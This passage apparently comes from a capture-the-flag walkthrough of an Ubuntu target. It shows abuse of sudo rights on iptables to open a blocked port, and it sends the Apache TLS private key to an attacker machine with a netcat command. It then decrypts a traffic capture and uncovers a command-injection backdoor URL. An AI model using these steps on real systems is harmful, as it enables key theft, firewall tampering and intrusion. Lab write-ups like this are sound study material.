We also note a directory /usr/lib/cgi-bin/ with strange permissions:

text
drwxr-x---  2 root h4ck3d 4.0K Aug 16  2023 cgi-bin
Iptables Rule Blocking Port 41312
Check current iptables rules:

bash
jack@ubuntu:~$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
...
User jack can run iptables with sudo:

bash
jack@ubuntu:~$ sudo -l
...
User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
Replace the DROP rule with ACCEPT:

bash
sudo /usr/sbin/iptables -R INPUT 1 -p tcp --dport 41312 -j ACCEPT
Verify:

bash
sudo /usr/sbin/iptables -L --line-numbers
1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
Now port 41312 is reachable.

5. Decrypting the PCAP to Find the Backdoor Command
The capture.pcap contains TLS-encrypted traffic. The private key for the HTTPS server is needed.

Locate the Apache SSL Key
Check Apache configuration:

bash
jack@ubuntu:~$ cat /etc/apache2/sites-enabled/000-default.conf
We see:

text
SSLCertificateKeyFile /etc/apache2/certs/apache.key
Download the key to our attacker machine:

bash
# On attacker: nc -lvnp 8000 > apache.key
# On target:
nc -q 0 192.168.145.49 8000 < /etc/apache2/certs/apache.key
Decrypt PCAP in Wireshark
Open capture.pcap

Edit → Preferences → Protocols → TLS

Add the apache.key (RSA keys list)

Filter: http

We see a request:

text
GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
This is a command injection endpoint.

